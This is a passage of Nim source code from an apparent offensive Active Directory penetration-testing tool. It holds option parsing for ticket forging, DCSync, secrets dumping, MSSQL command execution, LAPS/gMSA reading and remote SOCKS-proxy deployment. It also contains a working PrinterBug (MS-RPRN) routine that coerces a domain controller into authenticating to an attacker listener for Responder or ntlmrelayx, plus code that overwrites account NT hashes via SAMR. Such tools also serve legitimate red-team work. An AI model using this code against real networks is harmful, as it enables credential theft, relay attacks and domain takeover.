        result.ldapAdcsTemplate = value
      of "out":
        if result.protocol in ["krb5conf", "kerberos"]:
          result.krb5Out = value
        else:
          result.ldapAdcsOut = value
      of "realm":
        result.krb5Realm = value
      of "target-realm":
        result.krb5TargetRealm = value
      of "request":
        result.krb5Request = value.toLowerAscii()
      of "kirbi":
        result.krb5Kirbi = value
      of "forge":
        result.krb5Forge = value.toLowerAscii()
      of "sid":
        result.krb5Sid = value
      of "extra-sid":
        result.krb5ExtraSids.add value
      of "rid":
        result.krb5Rid = uint32(parseInt(value))
      of "duration":
        result.krb5DurationHours = parseInt(value)
      of "start-offset":
        result.krb5StartOffsetMinutes = parseInt(value)
      of "service":
        result.krb5Service = value
      of "altservice", "alt-service":
        result.krb5AltService = value
      of "aes-key":
        result.krb5AesKey = value
      of "kdc-key":
        result.krb5KdcKey = value
      of "pfx":
        result.ldapAdcsPfx = value
      of "key":
        if result.protocol == "kerberos":
          result.krb5Key = value
        else:
          result.ldapAdcsKey = value
      of "ccache":
        if result.protocol in ["mssql", "kerberos", "ldap", "smb", "scm", "bin", "cim",
                               "task", "tsch", "mmc", "winrm", "secrets", "dcsync",
                               "put", "get", "ls", "rm", "mkdir"]:
          result.ccachePath = value
        else:
          result.ldapAdcsCcache = value
      of "krb5-config", "krb5-conf":
        result.krb5ConfigPath = value
      of "upn":
        result.ldapAdcsUpn = value
      of "dns-name":
        result.ldapAdcsDns = value
      of "on-behalf-of":
        result.ldapAdcsOnBehalfOf = value
      of "decrypt-mslaps":
        result.ldapDecryptMsLaps = true
      of "blob-out":
        result.ldapMsLapsBlobOut = value
      of "get-gmsa":
        result.ldapGetGmsa = true
        if value.len > 0: result.ldapGmsaAccount = value
      of "dns-add":
        result.ldapDnsAdd = true
      of "dns-delete":
        result.ldapDnsDelete = true
      of "dns-replace":
        result.ldapDnsReplace = true
      of "zone":
        result.ldapDnsZone = value
      of "record":
        result.ldapDnsRecord = value
      of "type":
        result.ldapDnsType = value
      of "data":
        result.ldapDnsData = value
      of "ttl":
        result.ldapDnsTtl = parseInt(value)
      of "adcs-template":
        result.ldapAdcsTemplateModify = true
      of "add-member":
        result.ldapAddMember = true
      of "remove-member":
        result.ldapRemoveMember = true
      of "restore-deleted":
        result.ldapRestoreDeleted = true
      of "restore-to":
        result.ldapRestoreTo = value
      of "new-name":
        result.ldapNewName = value
      of "move":
        result.ldapMove = true
      of "move-to":
        result.ldapMoveTo = value
      of "bloodhound":
        result.ldapBloodhound = true
      of "bloodhound-out":
        result.ldapBloodhound = true
        result.ldapBloodhoundOut = value
      of "opsec-notes":
        result.ldapOpsecNotes = true
      of "include-deleted":
        result.ldapDeleted = true
      of "remove-ace":
        result.ldapAclRemove = true
      of "set-owner":
        result.ldapSetOwner = true
      of "nested-groups":
        result.ldapNestedGroups = true
      of "acl":
        result.ldapAcl = true
      of "cert":
        result.ldapCertFile = value
      of "enable":
        result.ldapEnableFlag = true
        result.ldapEnableUser = if result.ldapUser.len > 0: result.ldapUser else: result.ldapName
      of "disable":
        result.ldapDisableFlag = true
        result.ldapDisableUser = if result.ldapUser.len > 0: result.ldapUser else: result.ldapName
      of "set-password":
        result.ldapSetPassword = true
      of "new-pass":
        result.ldapNewPass = value
      of "delete-user":
        result.ldapDeleteKind = "user"
      of "delete-computer":
        result.ldapDeleteKind = "computer"
      of "delete-group":
        result.ldapDeleteKind = "group"
      of "limit":
        result.queryLimit = parseInt(value)
      of "rid-range":
        let parts = value.split('-')
        if parts.len == 2:
          result.ridBruteStart = uint32(parseInt(parts[0]))
          result.ridBruteEnd = uint32(parseInt(parts[1]))
        else:
          raise newException(ValueError, "rid-range expects start-end")
      of "dialects":
        for item in value.split(','):
          let clean = item.strip().replace("0x", "").replace("0X", "")
          if clean.len == 0:
            continue
          result.smbDialects.add uint16(parseHexInt(clean))
      of "path":
        result.winRmPath =
          if value.len > 0 and value[0] != '/': "/" & value
          else: value
      of "encrypt":
        result.msSqlEncryption = parseInt(value)
      of "rdp-proto":
        result.rdpProtocols = uint32(parseInt(value))
      else:
        raise newException(ValueError, "unknown option: " & key)
    of cmdEnd:
      discard

  if result.protocol.len == 0:
    usage()
    quit 1

  if result.concurrency < 1:
    raise newException(ValueError, "concurrency must be >= 1")
  if result.timeoutMs < 1:
    raise newException(ValueError, "timeout must be >= 1")
  if result.retries < 0:
    raise newException(ValueError, "retries must be >= 0")
  if result.port == 0:
    case result.protocol
    of "smb", "scm", "bin", "tsch", "put", "get", "ls", "rm", "mkdir", "dcsync", "secrets":
      result.port = 445
    of "scan":
      result.ports = @[]
      if result.topPorts > 0:
        for i in 0 ..< min(result.topPorts, TopTcpPorts.len):
          result.ports.add TopTcpPorts[i]
      elif result.udpScan:
        for port in [53, 67, 68, 69, 88, 111, 123, 137, 138, 161, 162, 389,
                     464, 500, 514, 520, 623, 1434, 1900, 4500, 5353, 5355]:
          result.ports.add port
      else:
        for port in CommonScanPorts:
          result.ports.add port
      result.port = result.ports[0]
    of "ldap":
      result.port = 389
    of "winrm":
      result.port = if result.useSsl: 5986 else: 5985
    of "mssql":
      result.port = 1433
    of "rdp":
      result.port = 3389
    of "ssh":
      result.port = 22
    of "vnc":
      result.port = 5901
    of "ftp":
      result.port = 21
    of "mysql":
      result.port = 3306
    of "postgres":
      result.port = 5432
    of "afp":
      result.port = 548
    of "nfs":
      result.port = 111
    of "webdav":
      if result.useSsl: result.port = 443
      else: result.port = 80
    of "http":
      result.port = if result.useSsl: 443 else: 80
    of "https":
      result.useSsl = true
      result.port = 443
    of "cim", "mmc":
      result.port = 135
    of "krb5conf":
      result.port = 88
    of "socks":
      result.port = if result.useSsl: 5986 else: 5985
      if result.socksPort == 0: result.socksPort = 1080
    else:
      discard
  if result.ports.len == 0 and result.port != 0:
    result.ports.add result.port

  if result.protocol == "ldap" and result.ldapGetGmsa and not result.useSsl and result.port == 389:
    result.useSsl = true
    result.port = 636
    result.ports = @[636]

  if result.protocol == "ldap" and result.ldapSchannel:
    result.useSsl = true
    if result.port == 0 or result.port == 389:
      result.port = 636
    result.ports = @[result.port]
    if result.ldapCertFile.len == 0 or result.ldapAdcsKey.len == 0:
      raise newException(ValueError, "--schannel requires --cert <pem> and --key <pem>")

  if result.protocol == "ldap" and not result.useSsl and not result.kerberos and result.port == 389 and
      result.ntlmHash.len == 0 and
      result.ldapNewPass.len > 0 and
      result.ldapCreateKind notin ["user", "computer"] and
      result.ldapSetPassword:
    result.useSsl = true
    result.port = 636
    result.ports = @[636]

  if result.protocol == "ldap" and result.ldapCreateKind == "computer":
    result.addComputer = true
    if result.computerName.len == 0:
      result.computerName = result.ldapName
    if result.computerPassword.len == 0:
      result.computerPassword = result.ldapNewPass

  if result.protocol in ["get", "put"] and result.localPath.len == 0 and
      result.targets.len > 1:
    result.localPath = result.targets[^1]
    result.targets.setLen(result.targets.len - 1)

  if result.protocol == "ldap" and result.ldapGetLaps:
    result.addComputer = false
    if result.computerName.len == 0:
      raise newException(ValueError, "--get-laps requires --computer <name>")
  if result.protocol == "ldap" and result.ldapCountKind.len > 0:
    case result.ldapCountKind
    of "users": result.users = true
    of "computers": result.computers = true
    of "groups": result.groups = true
    of "trusts": result.trusts = true
    of "gpos": result.gpos = true
    of "fgpp": result.ldapFgpp = true
    of "deleted": result.ldapDeleted = true
    of "locked", "locked-users": result.ldapLocked = true
    of "expired-passwords": result.ldapExpiredPasswords = true
    of "stale-users": result.ldapStaleUsers = true
    of "never-logged-on": result.ldapNeverLoggedOn = true
    of "certs", "certificates", "cert-inventory", "certificate-inventory":
      result.ldapCertInventory = true
    else:
      if result.customLdapFilter.len == 0:
        raise newException(ValueError, "--count expects users, computers, groups, trusts, gpos, fgpp, deleted, locked, expired-passwords, stale-users, never-logged-on, certs, or --filter")
  if result.addComputer and result.computerName.len == 0:
    raise newException(ValueError, "--computer or --add-computer is required")
  if result.addComputer and result.username.len == 0:
    raise newException(ValueError, "-u/--username is required for add computer")
  if result.addComputer and result.password.len == 0 and result.ntlmHash.len == 0 and not result.kerberos:
    raise newException(ValueError, "-p/--password is required for add computer")
  if result.ldapSetRbcd:
    if result.ldapFrom.len == 0 or result.ldapTo.len == 0:
      raise newException(ValueError, "--set-rbcd requires --from and --to")
  if result.protocol == "mssql":
    var oneShotCount = 0
    if result.customLdapFilter.len > 0: inc oneShotCount
    if result.mssqlQueryFile.len > 0: inc oneShotCount
    if result.remoteCommand.len > 0: inc oneShotCount
    if result.mssqlOleCommand.len > 0: inc oneShotCount
    if result.mssqlClrCommand.len > 0: inc oneShotCount
    if result.mssqlEnumDanger: inc oneShotCount
    if result.mssqlEnumImpersonate: inc oneShotCount
    if result.mssqlEnableXp: inc oneShotCount
    if result.mssqlEnableOle: inc oneShotCount
    if result.mssqlEnableClr: inc oneShotCount
    if oneShotCount > 1:
      raise newException(ValueError, "mssql one-shot modes are mutually exclusive: use only one of --query, --query-file, --cmd, --ole, --clr, --enum-danger, --enum-impersonate, --enable-xp, --enable-ole, or --enable-clr")
    if result.mssqlXpLinkServer.len > 0 and result.remoteCommand.len == 0:
      raise newException(ValueError, "--xp-link requires --cmd")
    if result.mssqlOleLinkServer.len > 0 and result.mssqlOleCommand.len == 0:
      raise newException(ValueError, "--ole-link requires --ole")
    if result.mssqlClrLinkServer.len > 0 and result.mssqlClrCommand.len == 0:
      raise newException(ValueError, "--clr-link requires --clr")
    if result.mssqlLinkChain.len > 0 and result.mssqlLinkServer.len == 0:
      result.mssqlLinkServer = result.mssqlLinkChain[0]
  if result.protocol == "https":
    result.useSsl = true

proc renderProtocolLine(node: JsonNode): string

proc socksProbeJson(host: string; port, socksPort: int;
                    op: string; success: bool; message: string;
                    remotePath = ""; pid = ""; taskName = "";
                    reverse = false; controlPort = 0): JsonNode =
  result = %*{
    "protocol": "socks",
    "operation": op,
    "host": host,
    "port": port,
    "socks_port": socksPort,
    "reverse": reverse,
    "control_port": controlPort,
    "success": success,
    "remote_path": remotePath,
    "pid": pid,
    "task_name": taskName,
    "message": message
  }

proc runSocksProxy(config: CliConfig) =
  let targets = parseTargets(config.targets)
  if targets.len == 0:
    raise newException(ValueError, "socks requires a target host")
  let host = targets[0]
  let timeout = max(config.timeoutMs, 30000)
  let socksPort = if config.socksPort > 0: config.socksPort else: 1080
  let controlPort = if config.socksControlPort > 0: config.socksControlPort else: socksPort + 1
  let listenIp =
    if config.socksBindAddr.len > 0: config.socksBindAddr
    else: "0.0.0.0"
  var reverseThread: Thread[tuple[bindIp: string; socksPort, controlPort: int]]
  if config.socksReverse and not config.socksKill:
    proc runController(args: tuple[bindIp: string; socksPort, controlPort: int]) {.thread.} =
      socksmod.runReverseSocksController(args.bindIp, args.socksPort, args.controlPort)
    createThread(reverseThread, runController, (listenIp, socksPort, controlPort))
    sleep(500)
  if config.socksKill:
    let r = socksmod.killSocksProxy(host, config.port, timeout,
      config.username, config.password, config.ntlmHash, config.domain,
      config.socksRemotePath, config.socksPid, config.socksTaskName,
      useSsl = config.useSsl, kerberos = config.kerberos)
    let j = socksProbeJson(host, config.port, socksPort, "kill", r.ok, r.message,
      reverse = config.socksReverse, controlPort = controlPort)
    if config.jsonOutput: echo $j
    else: echo renderProtocolLine(j)
    return
  let r = socksmod.deploySocksProxy(host, config.port, timeout, socksPort,
    config.username, config.password, config.ntlmHash, config.domain,
    config.socksAuth,
    listenIp,
    config.useSsl, config.kerberos, config.socksUserProcess or config.socksReverse,
    (if config.socksReverse: config.coerceListener else: ""),
    (if config.socksReverse: controlPort else: 0))
  let j = socksProbeJson(host, config.port, socksPort, "deploy", r.success, r.message,
    r.remotePath, r.pid, r.taskName, config.socksReverse, controlPort)
  if config.jsonOutput: echo $j
  else: echo renderProtocolLine(j)
  if config.socksReverse and r.success:
    joinThread(reverseThread)

proc runScan(config: CliConfig) =
  let rawTargets = parseTargets(config.targets)
  if rawTargets.len == 0:
    raise newException(ValueError, "no targets supplied")

  var targetList = rawTargets
  if rawTargets.len > 1 and not config.skipPing and not config.udpScan:
    var down = 0
    targetList = waitFor filterLiveTargets(rawTargets,
      min(config.concurrency, 64), max(config.timeoutMs, 1000),
      proc(host: string) = inc down)
    if not config.jsonOutput and down > 0:
      stderr.writeLine "host discovery: " & $targetList.len & "/" &
        $rawTargets.len & " up, skipping " & $down & " down (use --Pn to disable)"
    if targetList.len == 0:
      if not config.jsonOutput:
        stderr.writeLine "no live hosts after discovery - use --Pn to scan anyway"
      return

  var scanPorts: seq[int]
  var commonPorts: seq[int]
  var remainingPorts: seq[int]
  if config.ports.len > 512:
    for port in CommonScanPorts:
      if port in config.ports and port notin scanPorts:
        scanPorts.add port
        commonPorts.add port
    for port in config.ports:
      if port notin scanPorts:
        scanPorts.add port
        remainingPorts.add port
  else:
    scanPorts = config.ports

  let effectiveConcurrency =
    if scanPorts.len > 4096: min(config.concurrency, 256)
    elif scanPorts.len > 512: min(config.concurrency, 128)
    else: config.concurrency

  let totalProbes = targetList.len * scanPorts.len
  let progressEnabled = not config.jsonOutput and totalProbes >= 128 and isatty(stderr)
  var completedProbes = 0
  let progressStarted = epochTime()
  var lastProgressDraw = 0.0
  var progressFinished = false

  proc drawProgress(force = false) =
    if not progressEnabled:
      return
    let now = epochTime()
    if not force and completedProbes < totalProbes and now - lastProgressDraw < 0.10:
      return
    lastProgressDraw = now
    if completedProbes >= totalProbes:
      progressFinished = true
    const BarWidth = 32
    let doneWidth =
      if totalProbes <= 0: 0
      else: min(BarWidth, (completedProbes * BarWidth) div totalProbes)
    let percent =
      if totalProbes <= 0: 100
      else: min(100, (completedProbes * 100) div totalProbes)
    let elapsed = max(0.001, now - progressStarted)
    let rate = int(float(completedProbes) / elapsed)
    var eta = "--:--"
    if rate > 0 and completedProbes < totalProbes:
      let remaining = (totalProbes - completedProbes) div rate
      eta = align($((remaining div 60) mod 60), 2, '0') & ":" &
        align($(remaining mod 60), 2, '0')
    stderr.write("\r[" &
      repeat("=", doneWidth) &
      repeat("-", BarWidth - doneWidth) &
      "] " &
      align($percent & "%", 4) & "  " &
      $completedProbes & "/" & $totalProbes & " probes" &
      "  " & $rate & "/s" &
      "  eta " & eta)
    stderr.flushFile()

  proc progressTick() =
    inc completedProbes
    drawProgress()

  proc finishProgress() =
    if progressEnabled:
      completedProbes = totalProbes
      if not progressFinished:
        drawProgress(true)
      stderr.write("\n")
      stderr.flushFile()

  var byHost = initTable[string, seq[ProbeResult]]()
  var results: seq[ProbeResult]
  try:
    if config.udpScan:
      results = waitFor scanUdpTargetsPorts(targetList, scanPorts,
        effectiveConcurrency, config.timeoutMs, progressTick, config.retries)
    elif commonPorts.len > 0:
      let commonConcurrency = min(config.concurrency, min(8, commonPorts.len))
      results.add waitFor scanTargetsPorts(targetList, commonPorts, commonConcurrency,
        config.timeoutMs, progressTick, config.retries)
      if remainingPorts.len > 0:
        results.add waitFor scanTargetsPorts(targetList, remainingPorts,
          effectiveConcurrency, config.timeoutMs, progressTick, config.retries)
    else:
      results = waitFor scanTargetsPorts(targetList, scanPorts, effectiveConcurrency,
        config.timeoutMs, progressTick, config.retries)

    if config.ports.len > 512:
      var hasOpen = false
      for item in results:
        if item.status == psOpen:
          hasOpen = true
          break
      if not hasOpen and commonPorts.len > 0:
        let retryResults = waitFor scanTargetsPorts(targetList, commonPorts,
          min(4, commonPorts.len), max(config.timeoutMs, 1500), nil,
          max(config.retries, 1))
        for retry in retryResults:
          var replaced = false
          for index in 0 ..< results.len:
            if results[index].host == retry.host and results[index].port == retry.port:
              results[index] = retry
              replaced = true
              break
          if not replaced:
            results.add retry
  finally:
    finishProgress()
  if not config.udpScan:
    for index in 0 ..< results.len:
      enrichScanResult(results[index], config)
    applyDeepScanProbes(results, config)
  for item in results:
    if config.jsonOutput:
      if not config.openOnly or item.status == psOpen:
        echo $item.toJson
    else:
      byHost.mgetOrPut(item.host, @[]).add item
  if config.jsonOutput:
    return
  case config.outputFormat
  of "grepable":
    for host in targetList:
      if byHost.hasKey(host):
        var keep: seq[ProbeResult]
        for item in byHost[host]:
          if not config.openOnly or item.status == psOpen: keep.add item
        echo renderScanGrepable(host, keep)
  of "csv":
    var emittedHeader = false
    for host in targetList:
      if byHost.hasKey(host):
        var keep: seq[ProbeResult]
        for item in byHost[host]:
          if not config.openOnly or item.status == psOpen: keep.add item
        stdout.write renderScanCsv(keep, not emittedHeader)
        emittedHeader = true
  of "xml":
    stdout.write renderScanXmlHeader()
    for host in targetList:
      if byHost.hasKey(host):
        var keep: seq[ProbeResult]
        for item in byHost[host]:
          if not config.openOnly or item.status == psOpen: keep.add item
        stdout.write renderScanXml(host, keep)
    stdout.write renderScanXmlFooter()
  else:
    for host in targetList:
      if byHost.hasKey(host):
        echo renderScanText(host, byHost[host], config.openOnly, config.debugProbe)

proc smbNegotiateRequest(config: CliConfig): smbclient.SmbNegotiateRequest =
  result = smbclient.defaultSmbNegotiateRequest()
  if config.smbDialects.len > 0:
    result.dialects = config.smbDialects

proc smbCredential(config: CliConfig): smbclient.SmbCredential =
  smbclient.SmbCredential(
    username: config.username,
    password: config.password,
    ntlmHash: config.ntlmHash,
    domain: config.domain,
    ccache: config.ccachePath,
    krb5Config: config.krb5ConfigPath
  )

proc smbRequests(config: CliConfig): smbclient.SmbEnumRequests =
  smbclient.SmbEnumRequests(
    shares: config.shares,
    sessions: config.sessions,
    disks: config.disks,
    loggedOnUsers: config.loggedOnUsers,
    users: config.users,
    groups: config.groups,
    passwordPolicy: config.passwordPolicy,
    ridBrute: config.ridBrute,
    ridBruteStart: config.ridBruteStart,
    ridBruteEnd: config.ridBruteEnd,
    localAdmins: config.localAdmins
  )

proc ndrWstr(s: string): string =
  let wchars = s.len + 1
  result.add char(wchars and 0xff); result.add char((wchars shr 8) and 0xff)
  result.add char((wchars shr 16) and 0xff); result.add char((wchars shr 24) and 0xff)
  result.add char(0); result.add char(0); result.add char(0); result.add char(0)
  result.add char(wchars and 0xff); result.add char((wchars shr 8) and 0xff)
  result.add char((wchars shr 16) and 0xff); result.add char((wchars shr 24) and 0xff)
  for c in s:
    result.add c; result.add char(0)
  result.add char(0); result.add char(0)
  while (result.len mod 4) != 0: result.add char(0)

proc addU32LeStr(s: var string; v: uint32) =
  s.add char(v and 0xff); s.add char((v shr 8) and 0xff)
  s.add char((v shr 16) and 0xff); s.add char((v shr 24) and 0xff)

proc rprnCoerce*(host, printerTarget: string; port, timeoutMs: int;
                 credential: smbclient.SmbCredential;
                 listenerIp: string): Future[tuple[ok: bool; message: string]] {.async.} =
  var session: smbclient.SmbSession
  try:
    let smbPort = if port == 0: 445 else: port
    session = await smbclient.establishSmbSession(host, smbPort, timeoutMs, credential)
    if not session.authenticated:
      return (ok: false, message: "SMB authentication failed: " & session.message)
    let ctx = session.ctx
    let pipe = await smbclient.openSmbPipe(ctx, "spoolss")
    if pipe.fileId.len == 0:
      return (ok: false, message: "failed to open \\\\PIPE\\spoolss - Print Spooler may be stopped")
    let bindBytes = smbclient.buildDceRpcBindRprn(1'u32)
    let bindAck = await smbclient.rpcBindPipe(ctx, pipe, bindBytes)
    if not bindAck.bound:
      return (ok: false, message: "MS-RPRN bind rejected")
    var cid = 2'u32
    let targetName = "\\\\" & (if printerTarget.len > 0: printerTarget else: host)
    var openStub = ""
    openStub.addU32LeStr 0x00020000'u32
    openStub.add ndrWstr(targetName)
    openStub.addU32LeStr 0'u32
    openStub.addU32LeStr 0'u32
    openStub.addU32LeStr 0'u32
    openStub.addU32LeStr 0x00020000'u32
    let openResp = await smbclient.rpcCall(ctx, pipe, 1'u16, openStub, cid)
    inc cid
    if openResp.len < 24:
      return (ok: false, message: "RpcOpenPrinter returned short response (" & $openResp.len & " bytes)")
    let openStatus = block:
      var v = 0'u32
      if openResp.len >= 4:
        v = uint32(ord(openResp[openResp.len - 4])) or
            (uint32(ord(openResp[openResp.len - 3])) shl 8) or
            (uint32(ord(openResp[openResp.len - 2])) shl 16) or
            (uint32(ord(openResp[openResp.len - 1])) shl 24)
      v
    if openStatus != 0:
      return (ok: false, message: "RpcOpenPrinter failed 0x" & openStatus.toHex(8) &
        " - printer handle unavailable; Print Spooler may be configured but not accepting handles")
    let handle = openResp[0 ..< 20]
    let listenerUncPath = "\\\\" & listenerIp
    var notifStub = ""
    notifStub.add handle
    var fdwFlags = 0x00000100'u32
    notifStub.addU32LeStr fdwFlags
    notifStub.addU32LeStr 0'u32
    notifStub.addU32LeStr 0x00020004'u32
    notifStub.add ndrWstr(listenerUncPath)
    notifStub.addU32LeStr 0'u32
    notifStub.addU32LeStr 0'u32
    let notifResp = await smbclient.rpcCall(ctx, pipe, 65'u16, notifStub, cid)
    let notifStatus = block:
      var v = 0'u32
      if notifResp.len >= 4:
        v = uint32(ord(notifResp[notifResp.len - 4])) or
            (uint32(ord(notifResp[notifResp.len - 3])) shl 8) or
            (uint32(ord(notifResp[notifResp.len - 2])) shl 16) or
            (uint32(ord(notifResp[notifResp.len - 1])) shl 24)
      v
    if notifStatus in [0'u32, 0x00000005'u32, 0x00000006'u32, 0x000006BA'u32]:
      let note = case notifStatus
        of 0x00000005'u32: " (access denied - hash captured by Responder/relay)"
        of 0x000006BA'u32: " (listener not reachable - start Responder/ntlmrelayx first)"
        else: ""
      return (ok: true,
        message: "coerce triggered - DC authenticated to " & listenerUncPath & note)
    return (ok: false,
      message: "RpcRemoteFindFirstPrinterChangeNotificationEx returned 0x" & notifStatus.toHex(8))
  except CatchableError as e:
    return (ok: false, message: e.msg)
  finally:
    if session.ctx != nil: session.ctx.socket.close()

proc enumResultJson[T](r: smbclient.SmbEnumResult[T]; entries: JsonNode): JsonNode =
  %*{
    "attempted": r.attempted,
    "succeeded": r.succeeded,
    "rpc_status": "0x" & r.rpcStatus.toHex(8),
    "message": r.message,
    "entries": entries
  }

proc smbProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let credential = smbCredential(config)
  if config.smbSetHash:
    let oldNtHex = config.ntlmHash.split(':')[^1]
    let newNtHex = config.smbNewHash.split(':')[^1]
    if oldNtHex.len != 32 or newNtHex.len != 32:
      return %*{"protocol": "smb", "host": host, "success": false,
        "message": "--set-hash requires -H <old-nt-hash> and --new-hash <new-nt-hash> (32 hex chars each)"}
    var oldNtRaw = newString(16)
    var newNtRaw = newString(16)
    for i in 0 ..< 16:
      oldNtRaw[i] = chr(parseHexInt(oldNtHex[i*2 ..< i*2+2]))
      newNtRaw[i] = chr(parseHexInt(newNtHex[i*2 ..< i*2+2]))
    let target = if config.ldapUser.len > 0: config.ldapUser else: config.username
    let r = await smbclient.samrChangePasswordHashes(
      host, 445, max(config.timeoutMs, 8000),
      credential, target, oldNtRaw, newNtRaw,
      authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm)
    return %*{
      "protocol": "smb",
      "operation": "set-hash",
      "host": host,
      "reachable": r.authenticated,
      "authenticated": r.authenticated,
      "success": r.success,
      "username": config.username,
      "target_user": target,
      "rid": r.rid,
      "status": "0x" & r.status.toHex(8),
      "message": r.message,
      "error": r.error
    }
  var request = smbNegotiateRequest(config)
  var probe = await smbclient.probeSmb(host, config.port, config.timeoutMs,
    request, credential, true, smbRequests(config))
  if credential.hasCredential() and config.smbDialects.len == 0 and
      probe.authAttempted and not probe.authenticated:
    request = smbclient.defaultSmbNegotiateRequest()
    request.dialects = @[0x0210'u16]
    let retry = await smbclient.probeSmb(host, config.port, config.timeoutMs,
      request, credential, true, smbRequests(config))
    if retry.authenticated:
      probe = retry
  if (credential.hasCredential() or config.kerberos) and not probe.authenticated:
    var session: smbclient.SmbSession
    var lastSessionMessage = ""
    for attempt in 0 .. 2:
      try:
        session = await smbclient.establishSmbSession(
          host, config.port, max(config.timeoutMs, 1500), credential,
          if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm)
      except CatchableError as error:
        lastSessionMessage = error.msg.splitLines()[0]
        session = nil
      if session != nil and session.authenticated:
        break
      if session != nil and session.message.len > 0:
        lastSessionMessage = session.message
      if attempt < 2:
        await sleepAsync(150)
    if session != nil and session.authenticated:
      probe.host = host
      probe.port = config.port
      probe.reachable = true
      probe.speaksSmb = true
      probe.status = 0
      probe.authAttempted = true
      probe.authenticated = true
      probe.signingEnabled = session.negotiate.signingRequired or session.negotiate.signingEnabled
      probe.signingApplied = probe.signingEnabled
      probe.negotiate = session.negotiate
      probe.adminTree = smbclient.SmbTreeConnectInfo(
        attempted: true,
        connected: session.adminTreeId != 0,
        status: if session.adminTreeId != 0: 0'u32 else: 0xC0000022'u32,
        treeId: session.adminTreeId)
      probe.ipcTree = smbclient.SmbTreeConnectInfo(
        attempted: true,
        connected: session.ipcTreeId != 0,
        status: if session.ipcTreeId != 0: 0'u32 else: 0xC0000022'u32,
        treeId: session.ipcTreeId)
      probe.message =
        if session.message.len > 0: session.message
        else: "Kerberos session established"
      if session.ctx != nil and session.ipcTreeId != 0:
        let extras = await smbclient.enumerateSmbExtras(session.ctx,
          smbclient.SmbPipeInfo(), false, smbRequests(config))
        probe.sessions = extras.sessions
        probe.disks = extras.disks
        probe.loggedOnUsers = extras.loggedOnUsers
        probe.domains = extras.domains
        probe.domainUsers = extras.domainUsers
        probe.domainGroups = extras.domainGroups
        probe.passwordPolicy = extras.passwordPolicy
        probe.ridBrute = extras.ridBrute
        probe.localAdmins = extras.localAdmins
        probe.rdpUsers = extras.rdpUsers
        probe.dcomUsers = extras.dcomUsers
        probe.psRemoteUsers = extras.psRemoteUsers
    elif lastSessionMessage.len > 0:
      probe.authAttempted = true
      probe.message = lastSessionMessage
  var sharesJson = newJArray()
  var sessionsArr = newJArray()
  for entry in probe.sessions.entries:
    sessionsArr.add %*{
      "client": entry.clientName,
      "user": entry.userName,
      "open_files": entry.openFiles,
      "active_seconds": entry.activeSeconds,
      "idle_seconds": entry.idleSeconds
    }
  var disksArr = newJArray()
  for entry in probe.disks.entries: disksArr.add %entry.drive
  var loggedOnArr = newJArray()
  for entry in probe.loggedOnUsers.entries:
    loggedOnArr.add %*{
      "user": entry.userName,
      "logon_domain": entry.logonDomain,
      "other_domains": entry.otherDomains,
      "logon_server": entry.logonServer
    }
  var domainsArr = newJArray()
  for d in probe.domains: domainsArr.add %d.name
  var usersArr = newJArray()
  for entry in probe.domainUsers.entries:
    usersArr.add %*{"rid": entry.rid, "name": entry.name}
  var groupsArr = newJArray()
  for entry in probe.domainGroups.entries:
    groupsArr.add %*{"rid": entry.rid, "name": entry.name, "kind": entry.kind}
  var policyArr = newJArray()
  for entry in probe.passwordPolicy.entries:
    policyArr.add %*{
      "min_password_length": entry.minPasswordLength,
      "password_history": entry.passwordHistory,
      "password_properties": "0x" & entry.passwordProperties.toHex(8),
      "max_password_age_days": entry.maxPasswordAgeDays,
      "min_password_age_days": entry.minPasswordAgeDays,
      "lockout_threshold": entry.lockoutThreshold,
      "lockout_duration_minutes": entry.lockoutDurationMinutes,
      "lockout_window_minutes": entry.lockoutWindowMinutes
    }
  var ridArr = newJArray()
  for entry in probe.ridBrute.entries:
    ridArr.add %*{
      "rid": entry.rid,
      "name": entry.name,
      "domain": entry.domain,
      "sid_type": entry.sidType
    }
  proc localGroupJson(r: smbclient.SmbEnumResult[smbclient.SmbLocalGroupMember]): JsonNode =
    var arr = newJArray()
    for m in r.entries:
      arr.add %*{"sid": m.sid, "name": m.name, "domain": m.domain, "sid_type": m.sidType}
    result = enumResultJson(r, arr)
  for share in probe.shares:
    var perms = ""
    if share.canRead: perms.add "READ"
    if share.canWrite:
      if perms.len > 0: perms.add ","
      perms.add "WRITE"
    sharesJson.add %*{
      "name": share.name,
      "type": share.typ,
      "comment": share.comment,
      "access_probed": share.accessProbed,
      "access_status": "0x" & share.accessStatus.toHex(8),
      "maximal_access": "0x" & share.maximalAccess.toHex(8),
      "can_read": share.canRead,
      "can_write": share.canWrite,
      "permissions": perms
    }
  result = %*{
    "protocol": "smb",
    "host": probe.host,
    "port": probe.port,
    "reachable": probe.reachable,
    "speaks_smb": probe.speaksSmb,
    "status": "0x" & probe.status.toHex(8),
    "dialect": probe.negotiate.dialect,
    "signing_enabled": probe.negotiate.signingEnabled,
    "signing_required": probe.negotiate.signingRequired,
    "capabilities": {
      "dfs": probe.negotiate.dfs,
      "leasing": probe.negotiate.leasing,
      "large_mtu": probe.negotiate.largeMtu,
      "multi_channel": probe.negotiate.multiChannel,
      "persistent_handles": probe.negotiate.persistentHandles,
      "directory_leasing": probe.negotiate.directoryLeasing,
      "encryption": probe.negotiate.encryption
    },
    "max_transact_size": probe.negotiate.maxTransactSize,
    "max_read_size": probe.negotiate.maxReadSize,
    "max_write_size": probe.negotiate.maxWriteSize,
    "server_guid": probe.negotiate.serverGuid,
    "ntlm_challenge": {
      "offered": probe.ntlmChallenge.offered,
      "flags": "0x" & probe.ntlmChallenge.flags.toHex(8),
      "target_name": probe.ntlmChallenge.targetName,
      "server_challenge": probe.ntlmChallenge.serverChallengeHex,
      "netbios_computer": probe.ntlmChallenge.netbiosComputer,
      "netbios_domain": probe.ntlmChallenge.netbiosDomain,
      "dns_computer": probe.ntlmChallenge.dnsComputer,
      "dns_domain": probe.ntlmChallenge.dnsDomain,
      "dns_forest": probe.ntlmChallenge.dnsForest
    },
    "auth_implemented": true,
    "auth_attempted": probe.authAttempted,
    "authenticated": probe.authenticated,
    "username": config.username,
    "auth_domain": config.domain,
    "signing_enabled": probe.signingEnabled,
    "signing_applied": probe.signingApplied,
    "local_admin": probe.adminTree.connected,
    "admin_tree": {
      "attempted": probe.adminTree.attempted,
      "connected": probe.adminTree.connected,
      "status": "0x" & probe.adminTree.status.toHex(8),
      "tree_id": probe.adminTree.treeId,
      "share_type": probe.adminTree.shareType,
      "share_flags": "0x" & probe.adminTree.shareFlags.toHex(8),
